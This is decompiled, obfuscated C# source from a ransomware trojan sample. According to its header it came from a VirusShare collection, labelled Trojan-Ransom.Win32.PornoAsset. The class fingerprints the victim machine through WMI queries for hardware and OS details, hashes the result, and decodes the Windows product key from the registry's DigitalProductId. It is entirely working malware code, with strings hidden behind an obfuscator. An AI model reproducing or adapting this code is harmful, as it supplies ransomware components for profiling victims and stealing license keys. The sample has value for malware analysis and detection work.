// Decompiled with JetBrains decompiler
// Type: 
// Assembly: audiohd, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B3C2E6D6-337D-408B-994E-703E532E1FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.PornoAsset.dkhr-b435741867a0fdbf28756592cb30b1bd1f0b2169008f656b542888b53198a9b8.exe

using ___codefort;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Management;

internal sealed class \u0008
{
  public string \u0002() => this.\u0005() + I.\u0002(737969405) + this.\u0006();

  public string \u0003()
  {
    string str = (this.bd() + this.P() + this.bc()).ToString();
    return \u000F.\u0003.\u0003(str);
  }

  private string \u0005()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(I.\u0002(737969285), I.\u0002(737969300));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      empty = Convert.ToString(managementBaseObject[I.\u0002(737969337)]);
    try
    {
      string str = empty.Split('|')[0];
      int length = str.Split(' ')[0].Length;
      return str.Substring(length).TrimStart().TrimEnd();
    }
    catch
    {
      return I.\u0002(737969218);
    }
  }

  public static string \u0002()
  {
    string empty = string.Empty;
    return Registry.LocalMachine.OpenSubKey(I.\u0002(737969241)).GetValue(I.\u0002(737969172)).ToString().Contains(I.\u0002(737969191)) ? I.\u0002(737969193) : empty + I.\u0002(737969212);
  }

  public string \u0008()
  {
    string empty = string.Empty;
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey(I.\u0002(737969603));
    if (registryKey1 != null)
    {
      string str = (string) registryKey1.GetValue(I.\u0002(737969657)) + \u0008.\u0002();
    }
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(I.\u0002(737969603));
    if (registryKey2 != null)
      \u0008.\u0002((byte[]) registryKey2.GetValue(I.\u0002(737969547), (object) RegistryValueKind.DWord));
    return \u0008.\u0002((byte[]) registryKey2.GetValue(I.\u0002(737969547), (object) RegistryValueKind.DWord));
  }

  public static string \u0002(byte[] _param0)
  {
    char[] chArray1 = new char[24]
    {
      'B',
      'C',
      'D',
      'F',
      'G',
      'H',
      'J',
      'K',
      'M',
      'P',
      'Q',
      'R',
      'T',
      'V',
      'W',
      'X',
      'Y',
      '2',
      '3',
      '4',
      '6',
      '7',
      '8',
      '9'
    };
    char[] chArray2 = new char[29];
    ArrayList arrayList = new ArrayList();
    for (int index = 52; index <= 67; ++index)
      arrayList.Add((object) _param0[index]);
    for (int index1 = 28; index1 >= 0; --index1)
    {
      if ((index1 + 1) % 6 == 0)
      {
        chArray2[index1] = '-';
      }
      else
      {
        int index2 = 0;
        for (int index3 = 14; index3 >= 0; --index3)
        {
          int num = index2 << 8 | (int) (byte) arrayList[index3];
          arrayList[index3] = (object) (byte) (num / 24);
          index2 = num % 24;
          chArray2[index1] = chArray1[index2];
        }
      }
    }
    return new string(chArray2);
  }

  private string \u0006() => Registry.LocalMachine.OpenSubKey(I.\u0002(737969241)).GetValue(I.\u0002(737969172)).ToString().Contains(I.\u0002(737969191)) ? I.\u0002(737969568) : I.\u0002(737969585);

  private string bd()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(I.\u0002(737969285), I.\u0002(737969478));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      empty = Convert.ToString(managementBaseObject[I.\u0002(737969530)]);
    return empty;
  }

  private string bc()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(I.\u0002(737969285), I.\u0002(737969428));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      empty = Convert.ToString(managementBaseObject[I.\u0002(737969456)]);
    return empty;
  }

  public string P()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(I.\u0002(737969285), I.\u0002(737968845));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      empty = Convert.ToString(managementBaseObject[I.\u0002(737968887)]);
    return empty;
  }
}
